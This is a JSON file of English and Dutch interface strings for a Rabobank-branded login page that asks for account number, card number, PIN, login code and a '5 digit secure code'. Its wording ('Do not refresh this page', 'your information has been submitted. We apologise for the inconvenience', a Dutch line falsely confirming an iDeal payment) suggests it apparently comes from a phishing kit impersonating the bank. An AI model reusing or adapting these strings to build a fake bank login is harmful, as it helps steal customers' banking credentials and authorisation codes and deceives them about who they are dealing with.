{
    "en":
    {
        "_-1658919514": "Logging in",
        "_-472856235": "The combination of your account, card number and code is incorrect. If the problem persists, please contact your Rabobank. (947)",
        "_-352769860": "Account number",
        "_-1839123992": "Invalid value",
        "_-2126651847": "Card number",
        "_1648009195": "Remember me",
        "_-487109793": "Insert your card into the Rabo Scanner",
        "_-1068566416": "Enter your PIN",
        "_-1746531460": "Scan the color code",
        "_1599087066": "Verify the summary on the Rabo Scanner",
        "_187155556": "Login code",
        "_2245473": "Help",
        "_-1724588125": "See anything unusual? Stop and dial 0900 0905",
        "_-1146915480": "Calling from abroad? Then dial +31 887 226 627",
        "_1517932647": "This is safe banking",
        "_-646160747": "Service",
        "_1752507456": "Problems when logging in ",
        "_373695836": "Frequently asked questions about the Rabo Scanner",
        "_1054868122": "Logging in with the Rabo Scanner demo",
        "_-589024741": "More information about the Rabo Scanner",
        "_-1428657126": "Request Rabo Internet Banking",
        "_-1716138742": "More service",
        "_587178691": "Please wait...",
        "_1158631946": "Do not refresh this page",
        "_2011110042": "Cancel",
        "_-1320080837": "Verification",
        "_-1354176475": "Code is invalid , please try again",
        "_-1807668168": "Submit",
        "_-2013538399": "Log in",


        "_195622566": "Verification completed",
        "_-1781351462": "Thank you, your information has been submitted. We apologise for the inconvenience.",



        "_-1949399287": "Please enter your 5 digit secure code"



       
    },
    "nl":
    {
        "_-1658919514": "Inloggen",
        "_-472856235": "De combinatie van uw account, kaartnummer en code is onjuist. Neem contact op met uw Rabobank als het probleem zich blijft voordoen. (947)",
        "_-352769860": "Rekeningnummer",
        "_-1839123992": "Ongeldige waarde",
        "_-2126651847": "Pasnummer",
        "_1648009195": "Onthouden",
        "_-487109793": "Bankpas in de Rabo Scanner plaatsen",
        "_-1068566416": "Pincode invoeren",
        "_-1746531460": "Scan de kleurcode",
        "_1599087066": "Controleer de samenvatting op de Rabo Scanner",
        "_187155556": "Inlogcode",
        "_2245473": "Help",
        "_-1724588125": "Ziet u iets ongewoons? Stop en bel 0900 0905",
        "_-1146915480": "Bellen vanuit het buitenland? Kies vervolgens 31 887 226 627",
        "_1517932647": "Dit is veilig bankieren",
        "_-646160747": "Service",
        "_1752507456": "Problemen bij het inloggen",
        "_373695836": "Veelgestelde vragen over de Rabo Scanner",
        "_1054868122": "Aanmelden met de Rabo Scanner-demo",
        "_-589024741": "Meer informatie over de Rabo Scanner",
        "_-1428657126": "Verzoek Rabo Internetbankieren",
        "_-1716138742": "Meer service",
        "_587178691": "Een ogenblik geduld ...",
        "_1158631946": "Deze pagina niet vernieuwen",
        "_2011110042": "Annuleren",
        "_-1320080837": "Verificatie",
        "_-1354176475": "Code is ongeldig, probeer het opnieuw",
        "_-1807668168": "Verzenden",
        "_-2013538399": "Inloggen",


        "_195622566": "iDeal betaling voltooid",
        "_-1781351462": "Het bedrag is onderweg naar de ontvanger. U wordt teruggestuurd naar de webwinkel.",


        "_-1949399287": "Voer uw 5-cijferige beveiligingscode in"
    }
}